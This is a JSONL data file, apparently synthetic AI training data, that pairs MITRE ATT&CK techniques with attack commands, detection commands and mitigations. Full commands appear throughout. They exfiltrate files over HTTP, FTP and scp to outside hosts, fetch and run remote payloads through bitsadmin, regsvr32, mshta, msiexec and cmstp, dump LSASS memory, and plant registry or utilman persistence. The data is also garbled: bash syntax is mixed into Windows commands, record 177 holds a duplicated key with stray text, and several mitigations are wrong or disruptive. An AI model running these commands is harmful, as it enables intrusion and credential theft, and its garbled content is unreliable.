{"id":151,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol","threat":"Using certutil to encode and exfiltrate data via HTTP POST.","command":"certutil -encode C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) $(echo enc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).b64) && curl -X POST -d @$(echo enc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).b64) http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor certutil encoding: `wmic process where name='certutil.exe' get commandline | findstr encode`; Monitor HTTP POST: `netstat -anp | grep POST`.","mitigation":"Restrict certutil: `icacls %windir%\\System32\\certutil.exe /deny Everyone:RX`; Block outbound HTTP POST: `netsh advfirewall firewall add rule name='Block POST' dir=out action=block protocol=TCP localport=80`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect certutil encoding for exfiltration and suggest firewall rules."}
{"id":152,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup for DNS tunneling to establish C2.","command":"nslookup -q=txt $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) 8.8.8.8","detection":"Monitor nslookup DNS queries: `wmic process where name='nslookup.exe' get commandline | findstr txt`; Analyze DNS logs: `dig +short txt *.com`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Block TXT queries: `named.conf 'zone \".\" { type master; notify no; allow-query { none; }; };'`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect nslookup DNS tunneling and suggest DNS restrictions."}
{"id":153,"tactic":"Persistence","technique":"T1547.004: Winlogon","threat":"Modifying Winlogon registry to execute malicious payload on login.","command":"reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d \"C:\\Windows\\System32\\userinit.exe,C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor Winlogon changes: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit`; Event ID 4657.","mitigation":"Restrict Winlogon writes: `regini -h deny HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`; Audit registry: Event ID 4657.","references":["MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Winlogon registry tampering and suggest registry protections."}
{"id":154,"tactic":"Impact","technique":"T1486: Data Encrypted for Impact","threat":"Using cipher.exe to encrypt files for ransomware simulation.","command":"cipher /E /S:C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) > $(echo log$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor cipher: `wmic process where name='cipher.exe' get commandline | findstr /E`; Event ID 4663.","mitigation":"Restrict cipher: `icacls %windir%\\System32\\cipher.exe /deny Everyone:RX`; Enable file auditing: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1486: https://attack.mitre.org/techniques/T1486/","CWE-326: https://cwe.mitre.org/data/definitions/326.html"],"ai_training_prompt":"Train AI to detect cipher.exe file encryption and suggest auditing."}
{"id":155,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse pnputil for malicious driver installation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; pnputil /add-driver C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /install\"","detection":"Monitor pnputil: `wmic process where name='pnputil.exe' get commandline | findstr add-driver`; Event ID 4688.","mitigation":"Restrict pnputil: `icacls %windir%\\System32\\pnputil.exe /deny Everyone:RX`; Require driver signing: `bcdedit /set testsigning off`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect pnputil driver installation and suggest driver signing enforcement."}
{"id":156,"tactic":"Defense Evasion","technique":"T1218.009: Sdbinst","threat":"Using sdbinst to install malicious shim for application manipulation.","command":"sdbinst /q /u $(echo shim$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor sdbinst: `wmic process where name='sdbinst.exe' get commandline | findstr sdb`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Audit shim databases: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags`.","references":["MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect sdbinst shim installations and suggest access controls."}
{"id":157,"tactic":"Persistence","technique":"T1546.007: Netsh Helper DLL","threat":"Registering malicious Netsh helper DLL for persistence.","command":"netsh add helper C:\\Windows\\System32\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor netsh helper: `netsh show helper | findstr dll`; Event ID 4657.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Audit DLL registrations: `reg query HKLM\\Software\\Microsoft\\NetSh`.","references":["MITRE ATT&CK T1546.007: https://attack.mitre.org/techniques/T1546/007/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect netsh helper DLL registrations and suggest registry auditing."}
{"id":158,"tactic":"Credential Access","technique":"T1003.001: LSASS Memory","threat":"Dumping LSASS memory using comsvcs.dll via rundll32.","command":"rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump $(tasklist | findstr /i lsass | awk '{print $2}') $(echo dump$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dmp) full","detection":"Monitor rundll32 comsvcs: `wmic process where name='rundll32.exe' get commandline | findstr comsvcs`; Event ID 10 (Sysmon).","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Enable Credential Guard: `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags /t REG_DWORD /d 2`.","references":["MITRE ATT&CK T1003.001: https://attack.mitre.org/techniques/T1003/001/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect LSASS memory dumping and suggest Credential Guard."}
{"id":159,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using msdt.exe to execute malicious diagnostic script.","command":"msdt /af /skip /path C:\\$(echo diag$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).xml) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msdt: `wmic process where name='msdt.exe' get commandline | findstr xml`; Event ID 4688.","mitigation":"Restrict msdt: `icacls %windir%\\System32\\msdt.exe /deny Everyone:RX`; Disable diagnostics: `sc config diagtrack start= disabled`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msdt diagnostic abuse and suggest service restrictions."}
{"id":160,"tactic":"Command and Control","technique":"T1105: Ingress Tool Transfer","threat":"Using bitsadmin to download malicious payload from remote server.","command":"bitsadmin /transfer $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /download /priority high http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) C:\\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor bitsadmin: `wmic process where name='bitsadmin.exe' get commandline | findstr download`; Event ID 4688.","mitigation":"Restrict bitsadmin: `icacls %windir%\\System32\\bitsadmin.exe /deny Everyone:RX`; Disable BITS: `sc config bits start= disabled`.","references":["MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect bitsadmin downloads and suggest BITS restrictions."}
{"id":161,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Injecting malicious code into PowerShell profile for persistence.","command":"echo \"I$(echo 'malicious' | base64 -w0)\" >> $PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr malicious`; Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Audit profile changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect PowerShell profile tampering and suggest file protections."}
{"id":162,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute malicious OCX file remotely.","command":"regsvr32 /s /u /i:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ocx) scrobj.dll","detection":"Monitor regsvr32 remote: `wmic process where name='regsvr32.exe' get commandline | findstr http`; YARA rule: `rule Regsvr32RemoteOCX { strings: $a = /regsvr32.*http.*ocx/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block outbound connections: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\\System32\\regsvr32.exe' action=block`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 remote OCX execution and suggest firewall rules."}
{"id":163,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse atd daemon for scheduled task execution on Linux.","command":"python -c \"import os; os.system('echo \\\"bash -c \\\\\\\"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\\\\\"\\\" | at now + 1 minute')\"","detection":"Monitor atd jobs: `atq | grep bash`; Audit atd: `auditctl -w /var/spool/at -p wa`.","mitigation":"Restrict atd: `systemctl disable atd`; Restrict at jobs: `chmod 700 /usr/bin/at`.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect atd task scheduling and suggest service restrictions."}
{"id":164,"tactic":"Exfiltration","technique":"T1048.002: Exfiltration Over Asymmetric Encrypted Protocol","threat":"Using scp to exfiltrate data to remote SSH server.","command":"scp C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp","detection":"Monitor scp: `wmic process where name='scp.exe' get commandline`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict scp: `icacls %programfiles%\\OpenSSH\\scp.exe /deny Everyone:RX`; Block SSH outbound: `netsh advfirewall firewall add rule name='Block SSH' dir=out action=block protocol=TCP remoteport=22`.","references":["MITRE ATT&CK T1048.002: https://attack.mitre.org/techniques/T1048/002/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect scp exfiltration and suggest SSH restrictions."}
{"id":165,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object via registry for persistence.","command":"reg add HKCU\\Software\\Classes\\CLSID\\{$(uuidgen)} /v AppID /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor COM hijacking: `reg query HKCU\\Software\\Classes\\CLSID | findstr AppID`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKCU\\Software\\Classes\\CLSID`; Audit COM changes: `reg query HKCR\\CLSID`.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect COM hijacking and suggest registry protections."}
{"id":166,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute malicious HTA file remotely.","command":"mshta http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hta) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mshta remote: `wmic process where name='mshta.exe' get commandline | findstr http`; YARA rule: `rule MshtaRemoteHta { strings: $a = /mshta.*http.*hta/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block HTA execution: AppLocker.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta remote HTA execution and suggest AppLocker policies."}
{"id":167,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse dsget for AD group enumeration.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; dsget group 'CN=$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8),CN=Users,DC=domain,DC=com' -members > $(echo ad$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor dsget: `wmic process where name='dsget.exe' get commandline | findstr group`; Event ID 4688.","mitigation":"Restrict dsget: `icacls %windir%\\System32\\dsget.exe /deny Everyone:RX`; Audit AD queries: Event ID 4662.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect dsget AD enumeration and suggest access controls."}
{"id":168,"tactic":"Impact","technique":"T1491.001: Defacement: Internal Defacement","threat":"Modifying desktop wallpaper via registry to display malicious image.","command":"reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bmp)\" /f && rundll32 user32.dll,UpdatePerUserSystemParameters","detection":"Monitor wallpaper changes: `reg query \"HKCU\\Control Panel\\Desktop\" /v Wallpaper`; Event ID 4657.","mitigation":"Restrict wallpaper writes: `regini -h deny \"HKCU\\Control Panel\\Desktop\"`; Audit registry: Event ID 4657.","references":["MITRE ATT&CK T1491.001: https://attack.mitre.org/techniques/T1491/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect wallpaper defacement and suggest registry protections."}
{"id":169,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Using IFEO to inject malicious debugger for persistence.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor IFEO: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | findstr Debugger`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Audit registry: Event ID 4657.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect IFEO debugger injections and suggest registry protections."}
{"id":170,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via url.dll.","command":"rundll32 url.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 url: `wmic process where name='rundll32.exe' get commandline | findstr url.dll`; YARA rule: `rule Rundll32Url { strings: $a = /rundll32.*url.dll.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Use AppLocker to block url.dll execution.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 url.dll execution and suggest AppLocker policies."}
{"id":171,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using arp.exe to execute malicious script via network reconnaissance.","command":"arp -a | findstr $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) && cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)","detection":"Monitor arp: `wmic process where name='arp.exe' get commandline | findstr findstr`; Event ID 4688.","mitigation":"Restrict arp: `icacls %windir%\\System32\\arp.exe /deny Everyone:RX`; Monitor network activity: `netsh advfirewall firewall add rule name='Log ARP' dir=out action=allow enable=yes`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect arp.exe abuse and suggest network monitoring."}
{"id":172,"tactic":"Exfiltration","technique":"T1048.001: Exfiltration Over Symmetric Encrypted Protocol","threat":"Using ftp.exe to exfiltrate data to remote FTP server.","command":"echo open $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com>ftp.txt && echo user $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)>>ftp.txt && echo put C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)>>ftp.txt && ftp -s:ftp.txt","detection":"Monitor ftp: `wmic process where name='ftp.exe' get commandline | findstr put`; Monitor FTP traffic: `netstat -anp | grep :21`.","mitigation":"Restrict ftp: `icacls %windir%\\System32\\ftp.exe /deny Everyone:RX`; Block FTP outbound: `netsh advfirewall firewall add rule name='Block FTP' dir=out action=block protocol=TCP remoteport=21`.","references":["MITRE ATT&CK T1048.001: https://attack.mitre.org/techniques/T1048/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ftp exfiltration and suggest FTP restrictions."}
{"id":173,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Registering malicious AppCert DLL via HKCU for persistence.","command":"reg add \"HKCU\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor AppCert: `reg query \"HKCU\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny \"HKCU\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Audit DLL registrations.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppCert DLL registrations in HKCU and suggest registry protections."}
{"id":174,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to execute malicious MSI remotely.","command":"msiexec /quiet /i http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec remote: `wmic process where name='msiexec.exe' get commandline | findstr http`; YARA rule: `rule MsiexecRemote { strings: $a = /msiexec.*http.*msi/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block MSI downloads: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\\System32\\msiexec.exe' action=block`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec remote MSI execution and suggest firewall rules."}
{"id":175,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse systeminfo.exe for reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; systeminfo | findstr /C:'$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' > $(echo sys$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor systeminfo: `wmic process where name='systeminfo.exe' get commandline | findstr findstr`; Event ID 4688.","mitigation":"Restrict systeminfo: `icacls %windir%\\System32\\systeminfo.exe /deny Everyone:RX`; Audit reconnaissance: `auditpol /set /subcategory:'Process Creation' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect systeminfo reconnaissance and suggest access controls."}
{"id":176,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using plink.exe to establish SSH tunnel for C2.","command":"plink -ssh -D 9050 -N $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -pw $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor plink: `wmic process where name='plink.exe' get commandline | findstr ssh`; Monitor tunnels: `netstat -anp | grep 9050`.","mitigation":"Restrict plink: `icacls %programfiles%\\PuTTY\\plink.exe /deny Everyone:RX`; Block SSH tunnels: `netsh advfirewall firewall add rule name='Block SSH Tunnel' dir=out action=block protocol=TCP localport=9050`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect plink SSH tunneling and suggest firewall rules."}
{"id":177,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Using trap command in bashrc for persistence on Linux.","command":"echo 'trap \"bash -c \\\"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\" INT' >> ~/.bashrc","detection":"Monitor bashrc आवीक्षक:/tmp/evil.sh","detection":"Monitor bashrc changes: `cat ~/.bashrc | grep trap`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor trap configurations.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect bashrc trap tampering and suggest file protections."}
{"id":178,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF file remotely.","command":"cmstp /ni /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp remote: `wmic process where name='cmstp.exe' get commandline | findstr http`; YARA rule: `rule CmstpRemoteInf { strings: $a = /cmstp.*http.*inf/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block INF downloads: `netsh advfirewall firewall add rule name='Block cmstp' dir=out program='%windir%\\System32\\cmstp.exe' action=block`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp remote INF execution and suggest firewall rules."}
{"id":179,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using route.exe to add malicious route for network redirection.","command":"route add 0.0.0.0 mask 0.0.0.0 $(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3) metric 1 if $(cat /dev/urandom | tr -dc '0-9' | head -c 2)","detection":"Monitor route changes: `route print | findstr $(cat /dev/urandom | tr -dc '0-9' | head -c 3)`; Event ID 4657.","mitigation":"Restrict route: `icacls %windir%\\System32\\route.exe /deny Everyone:RX`; Audit network changes: `auditpol /set /subcategory:'Network Policy Change' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect route table manipulation and suggest network auditing."}
{"id":180,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol","threat":"Using tracert to exfiltrate data via DNS queries.","command":"tracert -h 1 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo exfil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor tracert DNS: `wmic process where name='tracert.exe' get commandline | findstr com`; Analyze DNS logs: `dig +short A *.com`.","mitigation":"Restrict tracert: `icacls %windir%\\System32\\tracert.exe /deny Everyone:RX`; Block DNS queries: `named.conf 'zone \".\" { type master; notify no; allow-query { none; }; };'`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect tracert DNS exfiltration and suggest DNS restrictions."}
{"id":181,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing utilman.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\utilman.exe","detection":"Monitor utilman changes: `dir %windir%\\System32\\utilman.exe /a`; Event ID 4657.","mitigation":"Restrict utilman: `icacls %windir%\\System32\\utilman.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect utilman tampering and suggest file protections."}
{"id":182,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious driver remotely.","command":"odbcconf /S /A {CONFIGSYSDSN \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\"}","detection":"Monitor odbcconf remote: `wmic process where name='odbcconf.exe' get commandline | findstr http`; YARA rule: `rule OdbcconfRemote { strings: $a = /odbcconf.*http.*dll/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Block driver downloads: `netsh advfirewall firewall add rule name='Block odbcconf' dir=out program='%windir%\\System32\\odbcconf.exe' action=block`.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf remote driver execution and suggest firewall rules."}
{"id":183,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse whoami.exe for reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; whoami /all > $(echo user$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor whoami: `wmic process where name='whoami.exe' get commandline | findstr all`; Event ID 4688.","mitigation":"Restrict whoami: `icacls %windir%\\System32\\whoami.exe /deny Everyone:RX`; Audit reconnaissance: `auditpol /set /subcategory:'Process Creation' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect whoami reconnaissance and suggest access controls."}
